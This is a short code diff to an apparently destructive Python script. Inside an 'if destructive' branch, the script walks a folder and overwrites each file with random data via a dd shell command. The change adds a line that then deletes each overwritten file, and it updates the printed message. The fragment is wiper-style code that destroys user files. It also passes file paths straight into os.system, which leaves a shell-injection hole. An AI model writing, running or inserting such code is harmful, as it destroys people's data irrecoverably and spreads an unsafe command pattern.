@@ -103,7 +103,8 @@ if destructive:
                 with open(os.path.join(root, new_name.lower()), "wb") as f:
                     os.system(f"dd if=/dev/random of='{os.path.join(root, new_name.lower())}' bs={file_size} count=1 &> /dev/null")
                     time.sleep(0.1)
-            print(f"{colours['red']}File {new_name} is corrupted.\033[0m")
+            os.remove(os.path.join(root, new_name.lower()))
+            print(f"{colours['red']}File {new_name} deleted (corrupted).\033[0m")
         time.sleep(0.1)
 
 for root, dirs, files in os.walk(folder):
